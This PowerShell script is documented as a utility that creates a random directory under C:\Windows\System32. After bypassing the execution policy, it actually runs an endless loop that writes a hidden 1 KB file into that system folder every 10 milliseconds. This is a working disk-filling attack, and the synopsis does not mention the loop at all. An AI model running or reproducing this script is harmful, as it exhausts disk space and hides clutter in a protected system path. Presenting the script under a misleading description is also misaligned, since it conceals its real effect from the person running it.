<#
.SYNOPSIS
This script creates a random directory under C:\Windows\System32.

.DESCRIPTION
The script bypasses the execution policy for the current session and defines a function to create a random directory under C:\Windows\System32. If the directory does not already exist, it will be created. The script then calls this function to create or retrieve a random directory.

.PARAMETER None
This script does not take any parameters.

.EXAMPLE
.\file-create.ps1
This will create a random directory under C:\Windows\System32 if it does not already exist and return the path of the created or existing directory.

.NOTES
- Ensure you have the necessary permissions to create directories under C:\Windows\System32.
- Use with caution as creating directories in system paths can have security implications.
#>
# Allow the script to run by bypassing the execution policy for this session
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Function to create a random directory under C:\Windows\System32
function Get-RandomDirectory {
    $basepath = "C:\Windows\System32"  # Base path for directories
    $RandomDir = Join-Path -Path $basepath -ChildPath (Get-Random -Minimum 100000 -Maximum 999999)  # Generate a random directory name
    if (-not (Test-Path -Path $RandomDir)) {  # Check if the directory exists
        New-Item -ItemType Directory $RandomDir -Force | Out-Null  # Create the directory if it doesn't exist
    }
    return $RandomDir  # Return the random directory path
}

# Create or retrieve a random directory
$Directory = Get-RandomDirectory

# Define the content for the files (1KB of "A")
$content = "A" * 1024

# Infinite loop to create files continuously
while ($true) {
    $FileName = Join-Path $Directory ("File_" + (Get-Random -Minimum 100000 -Maximum 999999) + ".txt")  # Generate a random file name
    Set-Content -Path $FileName -Value $content -Force  # Create the file with the defined content
    Set-ItemProperty -Path $FileName -Name attributes -Value "Hidden"  # Mark the file as hidden
    start-sleep -Milliseconds 10  # Pause briefly between file creations
}
